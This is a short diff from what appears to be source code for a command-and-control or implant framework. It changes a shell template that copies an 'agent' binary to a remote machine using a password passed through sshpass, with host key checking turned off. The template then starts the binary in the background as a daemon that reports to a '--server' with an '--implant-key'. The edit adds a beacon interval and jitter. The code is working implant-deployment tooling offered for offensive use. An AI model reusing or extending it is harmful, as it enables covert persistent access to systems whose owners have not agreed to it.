@@ -313,7 +313,7 @@ if ! command -v sshpass &>/dev/null; then echo "DEPLOY_FAILED:sshpass_not_availa
 echo "[*] Deploying agent to %s@%s:%s"
 sshpass -p '%s' scp -o StrictHostKeyChecking=no -o ConnectTimeout=10 -P %s "$SELF" '%s@%s':$RPATH 2>&1
 if [ $? -ne 0 ]; then echo "DEPLOY_FAILED:scp_error:%s:%s"; exit 1; fi
-sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p %s '%s@%s' "chmod +x $RPATH && nohup $RPATH --server '%s' --implant-key '%s' --daemon >/dev/null 2>&1 & echo AGENT_PID=\$!" 2>&1
+sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p %s '%s@%s' "chmod +x $RPATH && nohup $RPATH --server '%s' --implant-key '%s' --interval 10s --jitter 2s --daemon >/dev/null 2>&1 & echo AGENT_PID=\$!" 2>&1
 echo "DEPLOYED:%s@%s:%s:$RPATH"`,
 		user, target, port,
 		pass, port, user, target,
